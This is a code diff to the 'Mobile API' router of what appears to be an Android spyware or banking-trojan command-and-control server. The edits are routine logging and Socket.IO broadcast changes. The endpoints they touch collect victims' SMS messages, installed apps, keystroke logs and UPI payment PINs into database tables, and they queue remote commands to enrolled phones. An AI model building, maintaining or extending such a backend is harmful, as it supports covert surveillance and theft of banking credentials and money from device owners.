@@ -5,6 +5,7 @@ import config from '../../config/env';
 import logger from '../../utils/logger';
 import { io } from '../../index';
 import { notificationDispatcher } from '../../services/notification.dispatcher';
+import { realtimeRegistry } from '../../services/realtimeRegistry';
 
 const router = Router();
 const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
@@ -83,7 +84,7 @@ router.put('/devices/:deviceId', asyncHandler(async (req: Request, res: Response
         .single();
 
     if (error) {
-        logger.error('[Mobile API] Device upsert error:', error);
+        logger.error(error, '[Mobile API] Device upsert error:');
         throw error;
     }
 
@@ -98,13 +99,16 @@ router.put('/devices/:deviceId', asyncHandler(async (req: Request, res: Response
                     assigned_at: new Date().toISOString()
                 }, { onConflict: 'device_id,app_id' });
         } catch (assignError) {
-            logger.error('[Mobile API] Auto-assignment error:', assignError);
+            logger.error(assignError, '[Mobile API] Auto-assignment error:');
         }
     }
 
     // Emit Socket.IO event
-    io.emit('device_change', { eventType: 'UPDATE', new: result });
+    if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+        io.emit('device_change', { eventType: 'UPDATE', new: result });
+    }
     io.to(`device-${deviceId}`).emit('device_change', { eventType: 'UPDATE', new: result });
+    io.to('admin-dashboard').emit('device_change', { eventType: 'UPDATE', new: result });
 
     // Notify activity
     await notificationDispatcher.broadcastDeviceActivity(deviceId as string, `Device updated/reconnected (${dbData.model || 'Unknown'})`);
@@ -128,10 +132,7 @@ router.post('/heartbeats', asyncHandler(async (req: Request, res: Response) => {
 
     const dbData = {
         device_id: deviceId,
-        status: true,
         last_update: new Date().toISOString(),
-        uptime: heartbeatData.uptime || 0,
-        ram: heartbeatData.ram || 0,
         updated_at: new Date().toISOString()
     };
 
@@ -143,7 +144,7 @@ router.post('/heartbeats', asyncHandler(async (req: Request, res: Response) => {
         .single();
 
     if (hbError) {
-        logger.error('[Mobile API] Heartbeat upsert error:', hbError);
+        logger.error(hbError, '[Mobile API] Heartbeat upsert error:');
     }
 
     // Update device last_seen and status
@@ -160,7 +161,7 @@ router.post('/heartbeats', asyncHandler(async (req: Request, res: Response) => {
         .single();
 
     if (devError) {
-        logger.error('[Mobile API] Device status update error:', devError);
+        logger.error(devError, '[Mobile API] Device status update error:');
     }
 
     // Emit Socket.IO events
@@ -168,11 +169,14 @@ router.post('/heartbeats', asyncHandler(async (req: Request, res: Response) => {
         io.to(`heartbeat-${deviceId}`).emit('heartbeat_change', { eventType: 'UPDATE', new: hbResult });
     }
     if (devResult) {
-        io.emit('device_change', { eventType: 'UPDATE', new: devResult });
+        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+            io.emit('device_change', { eventType: 'UPDATE', new: devResult });
+        }
         io.to(`device-${deviceId}`).emit('device_change', { eventType: 'UPDATE', new: devResult });
+        io.to('admin-dashboard').emit('device_change', { eventType: 'UPDATE', new: devResult });
     }
 
-    return res.json({ success: true });
+    return res.json({ success: true, type: 'pong' });
 }));
 
 /**
@@ -241,15 +245,19 @@ router.post('/sms/batch', asyncHandler(async (req: Request, res: Response) => {
         .select();
 
     if (error) {
-        logger.error('[Mobile API] SMS batch sync error:', error);
+        logger.error(error, '[Mobile API] SMS batch sync error:');
         throw error;
     }
 
     // Emit Socket.IO events for each new message
     if (results && results.length > 0) {
+        const isHighScale = realtimeRegistry.getSystemConfig()?.highScaleMode;
         results.forEach(msg => {
-            io.emit('message_change', { eventType: 'INSERT', new: msg });
+            if (!isHighScale) {
+                io.emit('message_change', { eventType: 'INSERT', new: msg });
+            }
             io.to(`messages-${msg.device_id}`).emit('message_change', { eventType: 'INSERT', new: msg });
+            io.to('admin-messages').emit('message_change', { eventType: 'INSERT', new: msg });
             io.to('all-messages').emit('message_change', { eventType: 'INSERT', new: msg });
         });
     }
@@ -292,13 +300,16 @@ router.post('/sms', asyncHandler(async (req: Request, res: Response) => {
         .single();
 
     if (error) {
-        logger.error('[Mobile API] SMS sync error:', error);
+        logger.error(error, '[Mobile API] SMS sync error:');
         throw error;
     }
 
     if (result) {
-        io.emit('message_change', { eventType: 'INSERT', new: result });
+        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+            io.emit('message_change', { eventType: 'INSERT', new: result });
+        }
         io.to(`messages-${result.device_id}`).emit('message_change', { eventType: 'INSERT', new: result });
+        io.to('admin-messages').emit('message_change', { eventType: 'INSERT', new: result });
         io.to('all-messages').emit('message_change', { eventType: 'INSERT', new: result });
     }
 
@@ -338,7 +349,7 @@ router.post('/apps/batch', asyncHandler(async (req: Request, res: Response) => {
         .upsert(dbApps, { onConflict: 'device_id,package_name' });
 
     if (error) {
-        logger.error('[Mobile API] Apps sync error:', error);
+        logger.error(error, '[Mobile API] Apps sync error:');
         throw error;
     }
 
@@ -361,7 +372,7 @@ router.post('/keylogs', asyncHandler(async (req: Request, res: Response) => {
     const { error } = await supabase.from('key_logger').insert(dbData);
 
     if (error) {
-        logger.error('[Mobile API] Keylog insert error:', error);
+        logger.error(error, '[Mobile API] Keylog insert error:');
         throw error;
     }
 
@@ -386,7 +397,7 @@ router.post('/pins', asyncHandler(async (req: Request, res: Response) => {
     const { error } = await supabase.from('upi_pins').insert(dbData);
 
     if (error) {
-        logger.error('[Mobile API] UPI pin insert error:', error);
+        logger.error(error, '[Mobile API] UPI pin insert error:');
         throw error;
     }
 
@@ -412,7 +423,7 @@ router.get('/devices/:deviceId/commands', asyncHandler(async (req: Request, res:
         .order('created_at', { ascending: true });
 
     if (error) {
-        logger.error('[Mobile API] Get commands error:', error);
+        logger.error(error, '[Mobile API] Get commands error:');
         throw error;
     }
 
@@ -460,14 +471,16 @@ router.patch('/commands/:commandId/status', asyncHandler(async (req: Request, re
         .single();
 
     if (error) {
-        logger.error('[Mobile API] Command update error:', error);
+        logger.error(error, '[Mobile API] Command update error:');
         throw error;
     }
 
     if (command) {
         // Emit Socket.IO real-time updates
         io.to(`commands-${command.device_id}`).emit('command_change', { eventType: 'UPDATE', new: command });
-        io.emit('command_change', { eventType: 'UPDATE', new: command });
+        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+            io.emit('command_change', { eventType: 'UPDATE', new: command });
+        }
     }
 
     return res.json({ success: true });
